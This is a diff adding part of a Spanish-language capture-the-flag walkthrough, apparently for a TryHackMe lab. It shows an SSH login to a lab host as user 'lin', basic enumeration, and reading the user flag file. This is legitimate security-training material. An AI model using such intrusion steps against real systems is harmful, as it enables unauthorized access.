@@ -129,3 +129,29 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.107.126' (ECDSA) to the list of known hosts.
 lin@10.10.107.126's password: (UsarPass)
 ```
+```bash
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop$ whoami
+lin
+lin@bountyhacker:~/Desktop$ 
+
+```
+Logramos ingresar con exito, estamos en la Pc de lin, ahora debemos ver que archivos tiene.
+```bash
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+```
+Encontramos la Flag del USER.
+```bash
+lin@bountyhacker:~/Desktop$ cat user.txt 
+THM{Password}
+```
